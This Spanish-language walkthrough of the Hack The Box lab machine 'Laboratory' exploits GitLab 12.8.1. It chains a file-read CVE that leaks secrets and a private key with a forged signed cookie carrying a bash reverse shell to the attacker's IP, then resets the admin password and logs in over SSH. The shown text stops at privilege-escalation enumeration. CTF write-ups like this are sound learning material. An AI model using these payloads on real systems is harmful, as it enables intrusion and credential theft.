---
title: Hack The Box Laboratory
author: k4miyo
date: 2022-03-21
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [Bash, Ruby, Outdated Software, Patch Management]
ping: true
---

## Laboratory
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.216.

```bash
❯ ping -c 1 10.10.10.216
PING 10.10.10.216 (10.10.10.216) 56(84) bytes of data.
64 bytes from 10.10.10.216: icmp_seq=1 ttl=63 time=135 ms

--- 10.10.10.216 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 134.779/134.779/134.779/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.216 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 11:28 CST
Initiating SYN Stealth Scan at 11:28
Scanning 10.10.10.216 [65535 ports]
Discovered open port 80/tcp on 10.10.10.216
Discovered open port 443/tcp on 10.10.10.216
Discovered open port 22/tcp on 10.10.10.216
Completed SYN Stealth Scan at 11:28, 27.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.216
Host is up, received user-set (0.22s latency).
Scanned at 2022-03-21 11:28:08 CST for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.53 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 20 (880B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 121 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.216
   5   │     [*] Open ports: 22,80,443
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80,443 10.10.10.216 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 11:29 CST
Nmap scan report for 10.10.10.216
Host is up (0.33s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-title: Did not follow redirect to https://laboratory.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
```

Aquí ya vemos cosas interesantes, los dominios `laboratory.htb` y `git.laboratory.htb`; incluso lo podemos corroborar al hacer un `whatweb` a la dirección IP:

```bash
❯ whatweb http://10.10.10.216/
http://10.10.10.216/ [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.216], RedirectLocation[https://laboratory.htb/], Title[302 Found]
ERROR Opening: https://laboratory.htb/ - no address for laboratory.htb
```

Vemos que al hacer un `whatweb` a la dirección IP por el puerto 80, este nos redirige hacia `laboratory.htb` por el puerto 443. Por lo tanto, vamos a agregar los dominios a nuestro archivo `/etc/hosts` y antes de ver el contenido vía web, aplicaremos nuestro `whatweb`:

```bash
❯ whatweb https://laboratory.htb/
https://laboratory.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.216], JQuery, Script, Title[The Laboratory]
❯ whatweb https://git.laboratory.htb/
https://git.laboratory.htb/ [502 Bad Gateway] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.10.10.216], Script, Title[GitLab is not responding (502)], nginx
```

Algo que ya vemos es que nos enfrentamos a un [GitLab](https://about.gitlab.com/):

![](/assets/images/htb-laboratory/laboratory-web.png)

No contamos con credenciales de acceso; sin embargo, podemos registrarnos, así que eso haremos.

![](/assets/images/htb-laboratory/laboratory-web1.png)

Es importante que el correo que demos debe ser **loquesea@laboratory.htb**. Una vez ingresando, vamos a ver que versión de gitlab es:

![](/assets/images/htb-laboratory/laboratory-web2.png)

Nos enfrentamos antes ***GitLab Community Edition (CE) 12.8.1***; por lo tanto, vamos a buscar posibles exploits que nos ayuden a vulnerar la máquina.

```bash
❯ searchsploit gitlab 12
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
GitLab 12.9.0 - Arbitrary File Read                                                            | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                                            | ruby/webapps/49076.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Vemos que no está nuestra versión; sin embargo, es posible que pueda aplicar, por lo tanto vamos a buscar algún exploit que nos ayude a leer archivos del sistema y encontramos [cve-2020-10977](https://github.com/thewhiteh4t/cve-2020-10977). Por lo tanto, vamos a descargarlo y probarlo.

```bash
❯ wget https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
--2022-03-21 13:06:57--  https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8422 (8.2K) [text/plain]
Grabando a: «cve_2020_10977.py»

cve_2020_10977.py                100%[=======================================================>]   8.22K  --.-KB/s    en 0s      

2022-03-21 13:06:57 (97.2 MB/s) - «cve_2020_10977.py» guardado [8422/8422]
```

De acuerdo con al autor, nos dice como debemos ejecutarlo; por lo tanto, le pasamos los parámetros que nos indica y probaremos leer el `/etc/passwd`.

```bash
❯ python3 cve_2020_10977.py https://git.laboratory.htb k4miyo k4miyo123
----------------------------------
--- CVE-2020-10977 ---------------
--- GitLab Arbitrary File Read ---
--- 12.9.0 & Below ---------------
----------------------------------

[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]

[+] Target        : https://git.laboratory.htb
[+] Username      : k4miyo
[+] Password      : k4miyo123
[+] Project Names : ProjectOne, ProjectTwo

[!] Trying to Login...
[+] Login Successful!
[!] Creating ProjectOne...
[+] ProjectOne Created Successfully!
[!] Creating ProjectTwo...
[+] ProjectTwo Created Successfully!
[>] Absolute Path to File : /etc/passwd
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/2b6405acf51ef61d0dda1451135d4c3a/passwd

> /etc/passwd
----------------------------------------

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

----------------------------------------

[>] Absolute Path to File :
```

Vemos el `/etc/passwd` de la máquina víctima. Ahora debemos pensar o buscar algún recurso de interés que no ayude a ingresar a la máquina; podríamos tratar de ver `id_rsa`; sin embargo, no está.

```bash
[>] Absolute Path to File : /home/git/.ssh/id_rsa  
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/git/.ssh/id_rsa
[-] No such file or directory
[>] Absolute Path to File :
```

Algo curioso del resultado, es que aplica un **Directory Traversal**. Si vamos al final del repositorio, vemos unas ligas y la que nos interesa es [hackerone](https://hackerone.com/reports/827052), ya que encontramos que podemos obtener ejecución de comandos a nivel de sistema. Primero debemos obtener el valor de `secret_key_base` que se encuentra bajo la ruta `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`:

```bash
[+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/1affb44c93c09dc8fca22f1549d57a10/secrets.yml                 
                                                                                                                                 
> /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                                   
----------------------------------------                                                                                         
                                                                                                                                 
# This file is managed by gitlab-ctl. Manual changes will be                                                                     
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  
# and run `sudo gitlab-ctl reconfigure`.                                                                                         
                                                                                                                                 
---                                                                                                                              
production:                                                                                                                      
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9
d5ce620bc11838                                                                                                                   
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b6500
3510e4031e164137b3                                                                                                               
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0
b84263903fd06af                                                                                                                  
  openid_connect_signing_key: |                                                                                                  
    -----BEGIN RSA PRIVATE KEY-----                                                                                              
    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
    -----END RSA PRIVATE KEY-----


----------------------------------------

[>] Absolute Path to File : 
```

Despúes nos indica que debemos tener una instancia de gitlab en nuestra máquina, así que vamos a crearla. Primero instalamos lo que necesitamos con `sudo apt install docker.io` y `sudo apt-get install -y curl openssh-server ca-certificates perl`, despúes agregamos nuestro usuario en el grupo **docker** con `sudo usermod -a -G docker k4miyo`. Ahora necesitamos la imagen de gitlab, lo cual la obtendremos y corremos con `docker run gitlab/gitlab-ce:12.8.1-ce.0` (**Nota**: El proceso puede tardar un rato).

Después de un rato a que se instale y ejecute todo lo que se necesita, ejecutaremos `docker ps` para obtener el nombre del contenedor y luego `docker exec` para obtener un shell:

```bash
❯ docker ps
CONTAINER ID   IMAGE                          COMMAND             CREATED         STATUS                   PORTS                     NAMES
dcee149e3692   gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   2 minutes ago   Up 2 minutes (healthy)   22/tcp, 80/tcp, 443/tcp   suspicious_yonath
❯ docker exec -it suspicious_yonath bash
root@dcee149e3692:/#
```

De acuerdo con el autor, tenemos que cambiar el valor de la variable  `secret_key_base`, entonces lo hacemos:

```bash
root@dcee149e3692:/# head -n 10 /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 011b6fc5563759488d4d1651352dd288e858d0ebbb296c04aa4cad59405a4ed3ed416ae1bad4f901e2de36ba9c155539ec415c6d74305c3e23da323a55a625a3
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: ef967c004549aabb56054734d2da24eb605eea1d02f7c9757a9dea77cafd289d96deddad327ffd084a78cc98c4f0171b5477fae7f113a3c30d62f6bd8767d85a
root@dcee149e3692:/#
```

Aplicamos una reconfiguración con  `gitlab-ctl restart` y ahora debemos ejecutar `gitlab-rails console` para obtener una consola y ejecutar lo siguiente:

```bash
root@dcee149e3692:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config) irb(main):001:0> request.env["action_dispatch.cookies_serializer"] = :marshal irb(main):001:0> cookies = request.cookie_jar 
```

Nos puede salir muchas lineas al ejecutar los comandos, es normal y es propia de ejcutar dichos comandos. Ahora, de acuerdo con el usuario, nos indica ejecutar `erb = ERB.new("<%= 'echo vakzz was here > /tmp/vakzz' %>")`; nosotros lo cambiaremos para obtener una reverse shell:

```bash
irb(main):001:0> erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.27/443 0>&1'` %>")
```

Y por último, ejecutamos los siguientes comandos:

```bash
irb(main):001:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new) 
irb(main):001:0> cookies.signed[:cookie] = depr puts 
irb(main):008:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--eb4fb167aa8fa2da52b6edf10473d0a9e8baa71d
=> nil
irb(main):009:0>
```

Obtenemos una cookie, la cual debemos mandar al servidor; pero antes, nos ponemos en escucha por el puerto 443:

```bash
❯ curl -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo
6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9
ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZ
W5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--b07f80bd22c0771d604978b4577f643e0891f603" -k     *   Trying 10.10.10.216:443...                                                                                                   * Connected to git.laboratory.htb (10.10.10.216) port 443 (#0)                                                                   * ALPN, offering h2                                                                                                              
* ALPN, offering http/1.1                                       
* successfully set certificate verify locations:                                                                                 
*  CAfile: /etc/ssl/certs/ca-certificates.crt                                                                                    
*  CApath: /etc/ssl/certs                                                                                                        
* TLSv1.3 (OUT), TLS handshake, Client hello (1):                                                                                
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=laboratory.htb
*  start date: Jul  5 10:39:28 2020 GMT
*  expire date: Mar  3 10:39:28 2024 GMT
*  issuer: CN=laboratory.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /users/sign_in HTTP/1.1
> Host: git.laboratory.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBp
bnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pI
D4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvem
VuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHB
vcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--b07f80bd22c0771d604978b4577f643e0891f603
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.216] 35010
bash: cannot set terminal process group (405): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ whoami
whoami
git
git@git:~/gitlab-rails/working$
```

Ya nos encontramos dentro de la máquina víctima como el usuario **git**; sin embargo, vemos que nos encontramos dentro de un contenedor:

```bash
git@git:~/gitlab-rails/working$ hostname -I
hostname -I
172.17.0.2 
git@git:~/gitlab-rails/working$
```

Haremos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos y luego a encontrar una forma de salir del contenedor.

```bash
git@git:~$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0>        
=> nil
irb(main):003:0> User.active
=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @k4miyo>]>
irb(main):004:0> User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
irb(main):005:0>
```

Desde la consola de Gitlab podemos ver a los usuarios activos y los administradores; para este caso, **dexter** es el único usuario administrador; por lo tanto, vamos a ver si podemos cambiar su contraseña.

```bash
irb(main):008:0> u = User.find(1)
=> #<User id:1 @dexter>
irb(main):009:0> u.password = 'hola123hola'
=> "hola123hola"
irb(main):010:0> u.password_confirmation = 'hola123hola'
=> "hola123hola"
irb(main):011:0> u.save
Enqueued ActionMailer::DeliveryJob (Job ID: e7825ba1-d43a-4dd9-ab3b-a62e4cc6f107) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f0a94aed0f8 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):012:0>
```

Cambiamos la contraseña del usuario administrador **dexter** por **hola123hola**; vamos a ver si podemos ingresar al Gitlab:

![](/assets/images/htb-laboratory/laboratory-web3.png)

Ya ingresamos a los recursos del usuario **dexter**. Buscando un poco en los repositorios, nos encontramos con una `id_rsa`, por lo tanto la descargamos, le asignamos el privilegio 600 y tratamos de conectarnos a la máquina por SSH:

```bash
❯ vi id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa dexter@10.10.10.216
The authenticity of host '10.10.10.216 (10.10.10.216)' can't be established.
ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.216' (ECDSA) to the list of known hosts.
dexter@laboratory:~$ whoami
dexter
dexter@laboratory:~$
```

Ya estamos en la máquina víctima como el usuario **dexter** y podemos visualizar la flag (user.txt). Ahora nos toca escalar privilegios, por lo tanto, vamos a enumerar un poco el sistema.

```bash
dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
dexter@laboratory:~$ sudo -l
